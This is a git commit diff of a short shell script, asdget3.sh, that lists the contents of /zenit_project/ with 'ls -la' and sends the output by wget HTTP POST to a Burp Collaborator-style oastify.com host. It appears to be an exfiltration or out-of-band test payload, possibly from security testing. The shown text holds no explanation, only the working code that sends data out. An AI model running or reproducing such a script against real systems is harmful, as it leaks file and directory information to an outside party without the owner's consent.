124f22f29fa349ccd219fb962dd5020ae664aadc
vitaoagsec-b <vitaoagsec@gmail.com>
2025-11-01 15:58:11 -0300

    Update and rename asdget2.sh to asdget3.sh

--- asdget3.sh
+++ asdget3.sh
@@ -4,10 +4,10 @@
 SERVER_HOST="ophu3gyj4p4xp1zvzurewrg0vr1ipjd8.oastify.com"
 SERVER_PORT=80
 
-SERVER_PATH="/zenit_project/"   
+SERVER_PATH="/"   
 
 # Capture ls output
-OUTPUT=$(ls -la)
+OUTPUT=$(ls -la /zenit_project/)
 
 # Send output via HTTP POST using wget
 wget --quiet \
